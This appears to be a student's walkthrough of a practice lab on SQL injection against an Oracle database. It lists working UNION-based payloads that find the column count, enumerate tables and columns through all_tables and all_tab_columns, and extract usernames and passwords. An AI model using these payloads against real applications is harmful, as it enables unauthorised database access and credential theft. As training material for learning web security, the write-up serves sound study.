# Lab 06 :  SQL injection attack, listing the database contents on Oracle

## Overview:
- Level : PRACTITIONER
- SQL Injection on product category filter
- Union attack
- End Goal : Determine the name of this table and the columns And  log in as the administrator user. 



## Analysis:
- put ' as product category it give 500 internal server error


## Solution:
- determine number of column
    ' UNION SELECT 'def' FROM dual-- gives 500 internal server error
    ' UNION SELECT 'def','adfs' FROM dual-- gives 200 ok responce
    so there are two column

- to get details about tables
    ' UNION SELECT table_name,NULL FROM all_tables--

- USERS_SAJPJE table contains username and passwords

- to get columns name of USERS_SAJPJE table
    ' UNION SELECT column_name,NULL FROM all_tab_columns  WHERE table_name='USERS_SAJPJE'--

- columns
    PASSWORD_VMXBIK
    USERNAME_RMIXAP
    EMAIL

- get usernames and passwords
    ' UNION SELECT USERNAME_RMIXAP,PASSWORD_VMXBIK FROM USERS_SAJPJE--
